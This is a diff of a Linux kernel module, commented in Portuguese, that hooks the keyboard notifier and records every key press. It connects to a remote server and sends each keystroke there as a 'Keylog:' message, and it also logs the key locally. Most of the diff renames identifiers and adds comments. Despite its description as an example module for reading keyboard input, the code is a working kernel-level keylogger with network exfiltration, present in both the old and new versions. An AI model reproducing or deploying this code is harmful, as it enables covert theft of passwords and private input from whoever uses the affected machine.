@@ -1,8 +1,6 @@
 #include <linux/module.h>
 #include <linux/keyboard.h>
 #include <linux/input.h>
-#include "cliente.h"
-#include "keylog.h"
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/fs.h>
@@ -22,7 +20,7 @@ MODULE_DESCRIPTION("Exemplo de módulo do kernel para ler entradas de teclado");
 
 struct socket * socket = NULL;
 
-static const char *us_keymap[][2] = {
+static const char *mapa_de_teclas[][2] = {
     {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
     {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
     {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
@@ -58,41 +56,82 @@ static const char *us_keymap[][2] = {
     {"_PAUSE_", "_PAUSE_"},                                         // 119
 };
 
-void keycode_to_string(int keycode, int shift_mask, char *buf, unsigned int buf_size){
-    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
+u32 criaEndereco(u8 * ip);
+int enviarMensagem(struct socket * localSocket, const char * mensagem, const size_t tam, unsigned long flags);
+int conectarServidor(void);
+
+void converte_codigo_tecla_para_string(int codigo_tecla, int mascara_shift, char *buf, unsigned int tam_buf);
+int manipulador_evento_teclado(struct notifier_block *bloco_notificacao, unsigned long codigo, void *_parametro);
+static struct notifier_block bloco_observador_teclado = {
+    .notifier_call = manipulador_evento_teclado,
+};
+
+
+static int __init iniciaModulo(void)
+{
+    printk(KERN_INFO "Iniciando modulo.\n");
+    //Iniciar o servidor.
+    conectarServidor();
+
+    //Iniciar o notifier do teclado.
+    register_keyboard_notifier(&bloco_observador_teclado);
+    return 0;
+}
+
+static void __exit fechaModulo(void)
+{
+    printk(KERN_INFO "Fechando modulo.\n");
+    unregister_keyboard_notifier(&bloco_observador_teclado);
+}
+
+module_init(iniciaModulo);
+module_exit(fechaModulo);
+
+void converte_codigo_tecla_para_string(int codigo_tecla, int mascara_shift, char *buf, unsigned int tam_buf){
+    // Se a tecla esta dentro do intervalo de teclas mapeadas.
+    if (codigo_tecla > KEY_RESERVED && codigo_tecla <= KEY_PAUSE)
     {
-        const char *us_key = (shift_mask == 1)
-                                ? us_keymap[keycode][1]
-                                : us_keymap[keycode][0];
- 
-        snprintf(buf, buf_size, "%s", us_key);
+        // Se o shift estiver pressionado pega codigo na posicao 1 se nao pega na posicao 0.
+        const char *string_tecla = (mascara_shift == 1)
+                                ? mapa_de_teclas[codigo_tecla][1]
+                                : mapa_de_teclas[codigo_tecla][0];
+        // Copia o const char para o buffer como string.
+        snprintf(buf, tam_buf, "%s", string_tecla);
     }
 }
 
-int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, void *_param){
-    char keybuf[12] = {0};
-    struct keyboard_notifier_param *param = _param;
+int manipulador_evento_teclado(struct notifier_block *bloco_notificacao, unsigned long codigo, void *_parametro){
+    // Cria buffer para a conversao do codigo de tecla para string.
+    char buffer_teclas[12] = {0};
+
+    // Converte o parametro (void *) recebido prara (keyboard_notifier_param *). 
+    struct keyboard_notifier_param *parametro = _parametro;
  
-    if (!(param->down)) return NOTIFY_OK;
- 
-    keycode_to_string(param->value, param->shift, keybuf, 12);
- 
-    if (strlen(keybuf) < 1) return NOTIFY_OK;
- 
-    char reply[64];
-    memset(&reply, 0, 64);
-    strcat(reply, "Keylog: ");
-    strcat(reply, keybuf);
-    strcat(reply, "\n");
-    enviarMensagem(socket, reply, strlen(reply), MSG_DONTWAIT);
-    printk(KERN_INFO "Keylog: %s", keybuf);
+    if (!(parametro->down)) return NOTIFY_OK;
+    
+    // Converte o codigo da tecla na string equivalente e salva no buffer.
+    converte_codigo_tecla_para_string(parametro->value, parametro->shift, buffer_teclas, 12);
+    
+    // Se a string for nula ele termina a rotina aqui.
+    if (strlen(buffer_teclas) < 1) return NOTIFY_OK;
+    
+    // Cria uma string para enviar pelo socket.
+    char enviar[32];
+    memset(&enviar, 0, 32);
+
+    // Monta a string no padrão "Keylog: <tecla>".
+    strcat(enviar, "Keylog: ");
+    strcat(enviar, buffer_teclas);
+    strcat(enviar, "\n");
+
+    // Envia a string pelo socket.
+    enviarMensagem(socket, enviar, strlen(enviar), MSG_DONTWAIT);
+
+    // Printa no log (local) a tecla precionada.
+    printk(KERN_INFO "Keylog: %s", buffer_teclas);
  
     return NOTIFY_OK;
 }
-
-static struct notifier_block keysniffer_blk = {
-    .notifier_call = keyboard_event_handler,
-};
 
 u32 criaEndereco(u8 *ip){
     u32 addr = 0;
@@ -113,16 +152,11 @@ int enviarMensagem(struct socket *localSocket, const char * mensagem, const size
     struct kvec vec;
     int len, written = 0, left = tam;
 
-    //mm_segment_t oldmm;
-
     msg.msg_name = 0;
     msg.msg_namelen = 0;
     msg.msg_control = NULL;
     msg.msg_controllen = 0;
     msg.msg_flags = flags;
-
-    //oldmm = get_fs();
-    //set_fs(KERNEL_DS);
     
     while(1){
         vec.iov_len = left;
@@ -137,7 +171,7 @@ int enviarMensagem(struct socket *localSocket, const char * mensagem, const size
                 continue;
 
         }
-        //set_fs(oldmm);
+
         break;
     }
     return written ? written:len;
@@ -177,24 +211,5 @@ int conectarServidor(void){
     strcat(reply, "HOLA\n");
     enviarMensagem(socket, reply, strlen(reply), MSG_DONTWAIT);
 
-    register_keyboard_notifier(&keysniffer_blk);
-
     return 0;
 }
-
-static int __init iniciaModulo(void)
-{
-    printk(KERN_INFO "Iniciando modulo.\n");
-    conectarServidor();
-    
-    return 0;
-}
-
-static void __exit fechaModulo(void)
-{
-    printk(KERN_INFO "Fechando modulo.\n");
-    unregister_keyboard_notifier(&keysniffer_blk);
-}
-
-module_init(iniciaModulo);
-module_exit(fechaModulo);
